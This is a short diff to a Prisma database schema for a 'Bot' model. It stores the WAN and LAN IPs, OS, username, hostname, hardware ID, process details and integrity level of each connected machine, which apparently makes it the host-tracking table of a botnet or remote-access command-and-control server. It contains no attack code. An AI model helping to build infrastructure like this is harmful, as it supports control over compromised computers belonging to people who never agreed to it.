@@ -12,14 +12,17 @@ datasource db {
 
 model Bot {
   id    Int     @default(autoincrement()) @id
-  socketId String
-  wanIp String
-  lanIp String
-  os String
-  username String
-  hostname String
-  country String
-  lastSeen DateTime @updatedAt 
-  hwid String @unique
-  online Boolean? @default(false)
+  socketId String?
+  wanIp String?
+  lanIp String?
+  os String?
+  username String?
+  hostname String?
+  processName String?
+  processId Decimal?
+  architecture String?
+  integrity String?
+  country String?
+  lastSeen DateTime? @updatedAt 
+  hwid String? @unique
 }
